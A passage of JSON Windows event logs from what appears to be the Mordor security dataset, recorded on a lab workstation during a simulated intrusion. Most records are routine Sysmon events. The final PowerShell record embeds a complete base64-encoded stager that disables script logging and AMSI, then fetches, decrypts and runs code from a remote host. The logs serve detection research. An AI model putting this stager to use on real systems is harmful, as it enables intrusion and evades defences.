19:35:34","@timestamp":"2020-09-21T23:35:34.873Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230289,"SourceProcessId":"908","SourceThreadId":"4696","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:35:31.886","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:31","EventReceivedTime":"2020-09-21 19:35:34","@timestamp":"2020-09-21T23:35:34.873Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230290,"SourceProcessId":"908","SourceThreadId":"4696","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:35:31.886","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:31","EventReceivedTime":"2020-09-21 19:35:34","@timestamp":"2020-09-21T23:35:34.874Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230291,"SourceProcessId":"908","SourceThreadId":"4696","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:35:31.886","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Notifications\\Data\\418A073AA3BC3475","EventTypeOrignal":"INFO","EventID":13,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"host":"wec.internal.cloudapp.net","Channel":"Microsoft-Windows-Sysmon/Operational","UserID":"S-1-5-18","AccountType":"User","ThreadID":4048,"ProcessGuid":"{b34bc01c-22ae-5f69-b600-000000000900}","Details":"Binary Data","EventReceivedTime":"2020-09-21 19:35:34","Opcode":"Info","EventTime":"2020-09-21 19:35:32","@timestamp":"2020-09-21T23:35:34.876Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230292,"Task":13,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":2,"Image":"C:\\windows\\Explorer.EXE","Category":"Registry value set (rule: RegistryEvent)","UtcTime":"2020-09-21 23:35:32.819","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:37","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:36","Message":"Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=16276\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;\n \r\n\r\nDetails: \r\nCommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"\r\n","@timestamp":"2020-09-21T23:35:37.879Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":185102,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
